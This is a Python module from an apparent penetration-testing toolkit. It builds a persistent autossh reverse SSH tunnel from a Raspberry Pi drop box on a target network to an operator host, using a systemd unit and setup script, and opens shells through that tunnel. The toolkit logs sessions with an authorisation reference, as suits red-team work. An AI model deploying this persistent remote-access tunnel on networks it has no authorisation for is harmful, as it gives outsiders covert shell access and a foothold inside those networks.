"""Drop-box pivot: reverse SSH from the Pi back to the Queen.

The Pi is left on the target network and dials home. The Queen never needs a
route in — which is the only arrangement that works behind NAT, and the only
one that fails safe if the Pi is found and unplugged.

    Pi (drop box)  --- autossh -R 2222:localhost:22 --->  Queen (T470)
                                                          ssh -p 2222 localhost

This module does three things:

  1. `generate_unit()` renders the autossh systemd unit and the exact setup
     commands for the Pi. It does not silently reconfigure a remote host —
     it hands you a reviewable script.
  2. `connect()` opens a shell through an established tunnel from the Queen.
  3. Every session start and end is written to the Hive as a `pivot_session`
     event, so the engagement record shows when remote access existed.

**RAM reality.** The Pi 3B+ has 1 GB and the Hive already uses ~300-400 MB of
it. autossh itself is tiny (a few MB), so a short pivot alongside a running
Hive is fine. A long engagement with heavy tunnelled traffic is not, which is
why `--hive-pause` exists: it stops the dashboard (`hexbee-web`) while
leaving ingest (`hexbee-engine`) running, so evidence collection continues
while ~150 MB is freed.
"""

from __future__ import annotations

import shutil
import subprocess
from datetime import datetime, timezone
from pathlib import Path

UNIT_NAME = "hexbee-pivot.service"

UNIT_TEMPLATE = """\
[Unit]
Description=HexBee drop-box reverse tunnel to the Queen
After=network-online.target
Wants=network-online.target

[Service]
User={pi_user}
Environment=AUTOSSH_GATETIME=0
Environment=AUTOSSH_POLL=45
# -N: no remote command. -R: expose the Pi's sshd on the Queen's {remote_port}.
ExecStart=/usr/bin/autossh -M 0 -N \\
  -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" \\
  -o "ExitOnForwardFailure yes" -o "StrictHostKeyChecking accept-new" \\
  -i {key_path} \\
  -R {remote_port}:localhost:22 \\
  -p {queen_ssh_port} {queen_user}@{queen_host}
Restart=always
RestartSec=20
MemoryMax=64M

[Install]
WantedBy=multi-user.target
"""

SETUP_TEMPLATE = """\
# --- Run these on the Raspberry Pi (the drop box) ---------------------------
sudo apt-get install -y autossh
ssh-keygen -t ed25519 -N '' -f {key_path}
ssh-copy-id -i {key_path}.pub -p {queen_ssh_port} {queen_user}@{queen_host}

sudo tee /etc/systemd/system/{unit} > /dev/null <<'UNIT'
{unit_body}UNIT

sudo systemctl daemon-reload
sudo systemctl enable --now {unit}
systemctl status {unit} --no-pager

# --- On the Queen ----------------------------------------------------------
# The Queen's sshd must allow the reverse forward to be reachable locally.
# GatewayPorts stays 'no' on purpose: the tunnel is bound to 127.0.0.1 only,
# so nothing on the Queen's network can reach the drop box through it.
hexbee-queen pivot connect --port {remote_port}
"""


def _now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def generate_unit(queen_host: str, *, queen_user: str = "hexbee",
                  queen_ssh_port: int = 22, remote_port: int = 2222,
                  pi_user: str = "hexbee",
                  key_path: str = "/home/hexbee/.ssh/hexbee_pivot") -> dict:
    """Render the unit and the setup script for the Pi."""
    unit_body = UNIT_TEMPLATE.format(
        pi_user=pi_user, key_path=key_path, remote_port=remote_port,
        queen_ssh_port=queen_ssh_port, queen_user=queen_user,
        queen_host=queen_host)
    setup = SETUP_TEMPLATE.format(
        key_path=key_path, queen_ssh_port=queen_ssh_port, queen_user=queen_user,
        queen_host=queen_host, unit=UNIT_NAME, unit_body=unit_body,
        remote_port=remote_port)
    return {"unit_name": UNIT_NAME, "unit": unit_body, "setup": setup,
            "remote_port": remote_port}


def write_unit(dest_dir: str | Path, **kwargs) -> dict:
    dest = Path(dest_dir)
    dest.mkdir(parents=True, exist_ok=True)
    rendered = generate_unit(**kwargs)
    (dest / UNIT_NAME).write_text(rendered["unit"], encoding="utf-8")
    setup_path = dest / "setup-pivot.sh"
    setup_path.write_text("#!/usr/bin/env bash\nset -euo pipefail\n\n"
                          + rendered["setup"], encoding="utf-8")
    try:
        setup_path.chmod(0o755)
    except OSError:
        pass
    rendered["files"] = [str(dest / UNIT_NAME), str(setup_path)]
    return rendered


def tunnel_up(port: int = 2222) -> bool:
    """Is anything listening on the reverse-forward port?"""
    import socket

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(2)
        return sock.connect_ex(("127.0.0.1", port)) == 0


def hive_pause_commands(pause: bool = True) -> list[str]:
    """Commands to free (or restore) Hive RAM on the Pi during a pivot.

    Ingest is never stopped — losing evidence to save memory would be the
    wrong trade. Only the dashboard goes down.
    """
    action = "stop" if pause else "start"
    return [f"sudo systemctl {action} hexbee-web.service",
            "# hexbee-engine keeps running: ingest must not stop"]


def connect(port: int = 2222, user: str = "hexbee", *,
            command: str | None = None, hive_pause: bool = False) -> int:
    """Open a shell (or run one command) through the tunnel."""
    ssh = shutil.which("ssh")
    if ssh is None:
        raise RuntimeError("ssh is not installed")
    if not tunnel_up(port):
        raise RuntimeError(
            f"nothing is listening on 127.0.0.1:{port} — the drop box has not "
            f"dialled in. Check `systemctl status {UNIT_NAME}` on the Pi.")
    args = [ssh, "-p", str(port), "-o", "StrictHostKeyChecking=accept-new",
            f"{user}@127.0.0.1"]
    if hive_pause:
        args += ["-t", "; ".join(hive_pause_commands(True))
                 + "; bash -l; " + "; ".join(hive_pause_commands(False))]
    elif command:
        args += [command]
    return subprocess.call(args)


def session_event(device: str, state: str, port: int, case_id: int | None = None,
                  auth_ref: str = "", note: str = "") -> dict:
    return {
        "device": device, "event_type": "pivot_session", "occurred_at": _now(),
        "payload": {"state": state, "local_port": port, "case_id": case_id,
                    "authorisation": auth_ref, "note": note[:300],
                    "transport": "reverse ssh (autossh)"},
    }
